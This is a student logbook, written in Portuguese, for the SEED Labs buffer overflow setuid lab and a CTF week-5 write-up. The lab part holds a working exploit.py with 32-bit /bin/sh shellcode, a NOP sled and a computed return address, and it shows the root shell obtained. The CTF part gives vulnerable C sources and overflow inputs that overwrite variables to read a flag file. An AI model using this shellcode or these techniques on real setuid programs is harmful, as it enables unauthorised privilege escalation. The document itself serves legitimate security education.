# SEED Labs - Buffer Overflow Setuid Lab

## Task 1

Depois de correr `a32.out`, shellcode é executado com sucesso a partir da stack criando uma nova sessão shell sem privilégios root (UID != 0). 
```bash
[10/17/22]seed@VM:~/.../shellcode$ make all
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
[10/17/22]seed@VM:~/.../shellcode$ ./a32.out
$ id -u                                                                                                          
1000
$  
```

No entanto, ao alterar a ownership para root e torná-lo um programa Set-UID a sessão shell tem privilégios root - `euid=0(root)`.
```bash
[10/17/22]seed@VM:~/.../shellcode$ make setuid
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
sudo chown root a32.out a64.out
sudo chmod 4755 a32.out a64.out
[10/17/22]seed@VM:~/.../shellcode$ ./a32.out
# id                                                                                                             
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
#
```

## Task 2

```bash
[10/17/22]seed@VM:~/.../code$ make
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
sudo chown root stack-L1 && sudo chmod 4755 stack-L1
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
sudo chown root stack-L2 && sudo chmod 4755 stack-L2
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c
sudo chown root stack-L3 && sudo chmod 4755 stack-L3
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c
sudo chown root stack-L4 && sudo chmod 4755 stack-L4
[10/17/22]seed@VM:~/.../code$ ls -l
total 168
-rwxr-xr-x 1 seed seed   270 Oct  3 05:58 brute-force.sh
-rwxr-xr-x 1 seed seed   891 Oct  3 05:58 exploit.py
-rw-r--r-- 1 seed seed   965 Oct  3 05:58 Makefile
-rw-r--r-- 1 seed seed  1132 Oct  3 05:58 stack.c
-rwsr-xr-x 1 root seed 15908 Oct 17 07:12 stack-L1
-rwxrwxr-x 1 seed seed 18732 Oct 17 07:12 stack-L1-dbg
-rwsr-xr-x 1 root seed 15908 Oct 17 07:12 stack-L2
-rwxrwxr-x 1 seed seed 18732 Oct 17 07:12 stack-L2-dbg
-rwsr-xr-x 1 root seed 17112 Oct 17 07:12 stack-L3
-rwxrwxr-x 1 seed seed 20160 Oct 17 07:12 stack-L3-dbg
-rwsr-xr-x 1 root seed 17112 Oct 17 07:12 stack-L4
-rwxrwxr-x 1 seed seed 20152 Oct 17 07:12 stack-L4-dbg
```

## Task 3

Usando o comando `p` do debugger `gdb` foi possível obter o endereço guardado no registo `ebp` e o endereço do `buffer`. Tendo em conta que o valor do `frame pointer` é 0xffffca98, o valor do `return address` será 0xffffca98 + 4. De modo a descobrir a `distância` entre o endereço base do buffer e o return address, calculou-se a distância entre o ebp e o buffer (0xffffca98 - 0xffffca2c): 108. Uma vez que, o return address está 4 bytes acima do ebp, a `distância` é 108 + 4 = 112.

```bash
gdb-peda$ p $ebp
$1 = (void *) 0xffffca98
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffca2c
gdb-peda$ p/d 0xffffca98 - 0xffffca2c
$3 = 108
gdb-peda$ quit
```

O conteúdo do `shellcode[]` (código malicioso) foi substituído pelo código shellcode 32-bit, cujo tamanho é 27 bytes. Uma vez que o tamanho do array é 517, o `start` deverá ser <= 490 (517 - 27). Neste caso, colocou-se o código malicioso no final do array (start = 490) e o restante é preenchido com 0x90 (NOP´s).
O valor de `ret` calculado abaixo (figura 1) é 0xffffca98 + 8, no entanto, tendo em conta a nota 2 do guião - "the frame pointer value obtained from gdb is different from that during the actual execution (without using gdb)(...)so the actual frame pointer value will be larger.". Sendo assim o valor de `ret` deverá ser > 0xffffca98 + 8. O valor usado foi 0xffffca98 + 200. Este foi obtido por tentativa e erro e a condição do resultado 0xffffca98 + nnn não conter nenhum byte a zero está garantida, deste modo a função strcpy() não termina antes do esperado. 

![](./screenshots/logbook5_task3.png) Figura 1: Estrutura do badfile

exploit.py
```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 517 - len(shellcode)               # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffca98 + 200           # Change this number 
offset = 112              # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

Como se pode confirmar, depois de correr o programa `stack-L1` temos acesso a uma root shell - `euid=0(root)`

```sh
[10/16/22]seed@VM:~/.../code$ ./exploit.py 
[10/16/22]seed@VM:~/.../code$ ./stack-L1
Input size: 517
# id                                                                                                             
uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker
```

# CTF - Week 5

## Desafio 1

```
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%28s", &buffer);

    printf("Echo %s\n", buffer);

    printf("I like what you got!\n");
    
    FILE *fd = fopen(meme_file,"r");
    
    while(1){
        if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
            printf("%s", buffer);
        } else {
            break;
        }
    }


    fflush(stdout);
    
    return 0;
}
```

Pela análise do código source do desafio 1, verificou-se que o programa abre o ficheiro especificado em `meme_file`, que por defeito é `mem.txt`, no entanto, alterando o valor de `meme_file` é possível controlar o ficheiro que é aberto. A função `scanf` lê até 28 bytes do utilizador, guardando esse valor na variável `buffer` de tamanho 20 (possibilidade de buffer-overflow). Os 8 bytes extra podem ser utilizados para alterar o valor de `meme_file`, variável local declarada antes de `buffer`. Assim, o input pode ser uma string do género "aaaaaaaaaaaaaaaaaaaaflag.txt" - os primeiros 20 caracteres (aleatórios) são guardados no `buffer` (tamanho 20), e os últimos 8 (flag.txt) são utilizados para dar overwrite ao conteúdo de `meme_file`. O ficheiro flag.txt é aberto, dando acesso à flag.

![](./screenshots/CTF5.png) 

## Desafio 2

Depois de analisar o código source do desafio 2, verificou-se que foi declarada uma nova variável `val` (tamanho 4) entre `meme_file` e `buffer`. Desta vez, o programa irá verificar a igualdade entre o valor da nova variável `val` (por defeito 0xdeadbeef) e 0xfefc2223, sendo que o ficheiro especificado em `meme_file` é aberto apenas se esta igualdade for verdadeira. A função `scanf` lê agora até **32** bytes do utilizador, guardando esse valor na variável `buffer`, cujo tamanho não foi alterado (possibilidade de buffer-overflow).

```
#include <stdio.h>
#include <stdlib.h>

int main() {
    char meme_file[8] = "mem.txt\0";
    char val[4] = "\xef\xbe\xad\xde";
    char buffer[20];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    if(*(int*)val == 0xfefc2223) {
        printf("I like what you got!\n");
        
        FILE *fd = fopen(meme_file,"r");
        
        while(1){
            if(fd != NULL && fgets(buffer, 20, fd) != NULL) {
                printf("%s", buffer);
            } else {
                break;
            }
        }
    } else {
        printf("You gave me this %s and the value was %p. Disqualified!\n", meme_file, *(long*)val);
    }

    fflush(stdout);
    
    return 0;
}
```

Estas alterações não mitigam na totalidade o problema, porque o primeiro argumento da função `scanf` foi alterado de 28 para 32, mantendo-se o tamanho do `buffer`, continuando a ser possível dar overwrite ao conteúdo de `meme_file`. Assim, no exploit-example.py é necessário fazer alterações no input tal como é sugerido na figura seguinte.

![](./screenshots/CTF5a.png) 

Ao escrever "aaaaaaaaaaaaaaaaaaaa\x23\x22\xfc\xfeflag.txt" - os primeiros 20 caracteres (aleatórios) são guardados no `buffer` (tamanho 20), os 4 bytes seguintes (0xfefc2223) serão guardados na variável `val` (tornando a condição no if verdadeira) e os últimos 8 (flag.txt) são utilizados para dar overwrite ao conteúdo de `meme_file`. O ficheiro flag.txt é aberto, dando acesso à flag. 
Ao correr o comando `checksec` reparou-se que a arquitetura é little-endian, por isso é necessário cuidado ao escrever os 4 bytes (\x23\x22\xfc\xfe) do input, isto é, devem ser escritos do LSB para o MSB.  

![](./screenshots/CTF5b.png) 
